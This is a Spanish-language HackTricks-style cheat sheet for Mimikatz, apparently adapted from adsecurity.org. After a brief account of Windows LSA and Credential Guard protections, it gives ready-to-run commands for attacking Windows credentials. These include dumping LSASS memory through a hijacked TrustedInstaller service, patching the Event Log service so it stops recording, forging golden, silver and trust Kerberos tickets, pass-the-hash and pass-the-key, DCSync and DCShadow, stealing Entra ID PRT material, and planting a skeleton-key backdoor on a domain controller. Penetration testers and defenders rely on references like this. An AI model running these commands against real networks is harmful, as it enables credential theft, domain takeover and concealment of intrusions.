# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Esta página se basa en una de [adsecurity.org](https://adsecurity.org/?page_id=1821)**. ¡Consulta el original para obtener más información!<sup>[[3]](#references)</sup>

## LM y texto claro en memoria

Desde Windows 8.1 y Windows Server 2012 R2 en adelante, se han implementado medidas importantes para protegerse contra el robo de credenciales:

- **Los hashes LM y las contraseñas en texto claro** ya no se almacenan en memoria para mejorar la seguridad. Es necesario configurar un ajuste específico del registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, con un valor DWORD de `0` para deshabilitar Digest Authentication, garantizando que las contraseñas en "texto claro" no se almacenen en caché en LSASS.

- **LSA Protection** se introduce para proteger el proceso Local Security Authority (LSA) contra la lectura no autorizada de memoria y la inyección de código. Esto se consigue marcando LSASS como un proceso protegido. La activación de LSA Protection implica:
1. Modificar el registro en _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ estableciendo `RunAsPPL` en `dword:00000001`.
2. Implementar un Group Policy Object (GPO) que aplique este cambio del registro en todos los dispositivos administrados.

A pesar de estas protecciones, herramientas como Mimikatz pueden eludir LSA Protection utilizando drivers específicos, aunque es probable que estas acciones queden registradas en los event logs.

En las workstations modernas esto es aún más importante porque **Credential Guard está habilitado de forma predeterminada en muchos sistemas Windows 11 22H2+ y Windows Server 2025 unidos a un dominio y que no son DC**, mientras que **LSASS-as-PPL está habilitado de forma predeterminada en instalaciones nuevas de Windows 11 22H2+**. En la práctica, esto significa que `sekurlsa::logonpasswords` suele devolver menos información de la que esperaba el tradecraft antiguo, y los operadores recurren cada vez más a **minidumps offline**, a la **extracción de claves Kerberos (`sekurlsa::ekeys`)** o a módulos orientados a **CloudAP/PRT**. Para consultar la parte de protección, revisa [Windows credentials protections](credentials-protections.md).

### Contrarrestar la eliminación de SeDebugPrivilege

Los administradores normalmente tienen SeDebugPrivilege, lo que les permite depurar programas. Este privilegio puede restringirse para evitar memory dumps no autorizados, una técnica común utilizada por los atacantes para extraer credenciales de la memoria. Sin embargo, incluso después de eliminar este privilegio, la cuenta TrustedInstaller todavía puede realizar memory dumps utilizando una configuración de servicio personalizada:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Esto permite volcar la memoria de `lsass.exe` en un archivo, que luego puede analizarse en otro sistema para extraer credenciales:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Opciones de Mimikatz

La manipulación de registros de eventos en Mimikatz implica dos acciones principales: borrar los registros de eventos y aplicar un parche al servicio Event para impedir el registro de nuevos eventos. A continuación se muestran los comandos para realizar estas acciones:

#### Borrado de registros de eventos

- **Comando**: Esta acción tiene como objetivo eliminar los registros de eventos, dificultando el seguimiento de actividades maliciosas.
- Mimikatz no proporciona un comando directo en su documentación estándar para borrar registros de eventos directamente desde su línea de comandos. Sin embargo, la manipulación de registros de eventos normalmente implica usar herramientas del sistema o scripts externos a Mimikatz para borrar registros específicos (por ejemplo, mediante PowerShell o el Visor de eventos de Windows).

#### Función experimental: aplicación de parches al servicio Event

- **Comando**: `event::drop`
- Este comando experimental está diseñado para modificar el comportamiento del Event Logging Service e impedir eficazmente que registre nuevos eventos.
- Ejemplo: `mimikatz "privilege::debug" "event::drop" exit`

- El comando `privilege::debug` garantiza que Mimikatz opere con los privilegios necesarios para modificar los servicios del sistema.
- A continuación, el comando `event::drop` aplica un parche al servicio Event Logging.

### Ataques de Kerberos Ticket

Usa los comandos siguientes como recordatorio rápido de la sintaxis. Las páginas dedicadas a [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) y [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contienen las consideraciones actualizadas sobre AES/PAC/opsec.

### Creación de Golden Ticket

Un Golden Ticket permite la suplantación con acceso a todo el dominio. Comando y parámetros principales:

- Comando: `kerberos::golden`
- Parámetros:
- `/domain`: El nombre del dominio.
- `/sid`: El Security Identifier (SID) del dominio.
- `/user`: El nombre de usuario que se suplantará.
- `/krbtgt`: El hash NTLM de la cuenta de servicio KDC del dominio.
- `/ptt`: Inyecta directamente el ticket en la memoria.
- `/ticket`: Guarda el ticket para usarlo posteriormente.

Ejemplo:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets otorgan acceso a servicios específicos. Comando y parámetros principales:

- Comando: Similar a Golden Ticket, pero dirigido a servicios específicos.
- Parámetros:
- `/service`: El servicio objetivo (p. ej., cifs, http).
- Otros parámetros similares a Golden Ticket.

Ejemplo:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Creación de Trust Tickets

Los Trust Tickets se utilizan para acceder a recursos entre dominios aprovechando las relaciones de confianza. Comandos y parámetros clave:

- Comando: Similar a Golden Ticket, pero para relaciones de confianza.
- Parámetros:
- `/target`: El FQDN del dominio objetivo.
- `/rc4`: El hash NTLM de la cuenta de confianza.

Ejemplo:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Comandos adicionales de Kerberos

- **Listado de tickets**:

- Comando: `kerberos::list`
- Lista todos los tickets de Kerberos de la sesión del usuario actual.

- **Pass the Cache**:

- Comando: `kerberos::ptc`
- Inyecta tickets de Kerberos desde archivos de caché.
- Ejemplo: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Comando: `kerberos::ptt`
- Permite usar un ticket de Kerberos en otra sesión.
- Ejemplo: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purga de tickets**:
- Comando: `kerberos::purge`
- Elimina todos los tickets de Kerberos de la sesión.
- Es útil antes de usar comandos de manipulación de tickets para evitar conflictos.

### Over-Pass-the-Hash / Pass-the-Key

Si `RC4` está deshabilitado o no es fiable, Mimikatz puede parchear **claves de Kerberos AES128/AES256** en la sesión de inicio de sesión actual en lugar de usar únicamente un hash NT. Esto suele adaptarse mejor a los dominios modernos que tratar `sekurlsa::pth` como algo exclusivo de NTLM.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` reutiliza el proceso actual en lugar de generar una nueva consola, lo que resulta útil cuando quieres ejecutar inmediatamente comandos como `lsadump::dcsync` en el mismo contexto.

### Manipulación de Active Directory

- **DCShadow**: Hacer que temporalmente una máquina actúe como un DC para manipular objetos de AD. Consulta [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Imita a un DC para solicitar datos de contraseñas. Consulta [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Acceso a credenciales

- **LSADUMP::LSA**: Extraer credenciales de LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Suplantar a un DC usando los datos de contraseña de una cuenta de equipo.

- _No se proporciona ningún comando específico para NetSync en el contexto original._

- **LSADUMP::SAM**: Acceder a la base de datos SAM local.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Descifrar secretos almacenados en el registro.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Establecer un nuevo hash NTLM para un usuario.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Recuperar información de autenticación de trust.
- `mimikatz "lsadump::trust" exit`

### Credenciales de Cloud / Entra ID

En hosts **Entra ID** o **hybrid-joined**, `sekurlsa::cloudap` puede exponer material almacenado en caché del **Primary Refresh Token (PRT)** desde LSASS. Si la clave de Proof-of-Possession asociada está protegida por software, `dpapi::cloudapkd` puede derivar el material de clave en texto claro/derivada necesario para los flujos posteriores de **Pass-the-PRT**.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Esto se vuelve mucho más difícil cuando la key está respaldada por TPM, pero vale la pena comprobarlo en hybrid endpoints porque los datos de CloudAP almacenados en caché pueden ser más interesantes que el resultado clásico de `wdigest`.<sup>[[2]](#references)</sup> Para la cadena de abuso del lado cloud, consulta [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Misceláneo

- **MISC::Skeleton**: Inyectar un backdoor en LSASS de un DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalada de privilegios

- **PRIVILEGE::Backup**: Adquirir derechos de backup.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtener privilegios de debug.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Mostrar las credentials de los usuarios con sesión iniciada.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extraer tickets de Kerberos de la memoria.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulación de SID y tokens

- **SID::add/modify**: Cambiar el SID y SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _No hay ningún comando específico para modify en el contexto original._

- **TOKEN::Elevate**: Suplantar tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Permitir múltiples sesiones RDP.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Listar sesiones de TS/RDP.
- _No se proporcionó ningún comando específico para TS::Sessions en el contexto original._

### Vault

- Extraer passwords de Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## Referencias

- [1] [The Hacker Tools – Módulos de Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB y Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Referencia de comandos de Mimikatz](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
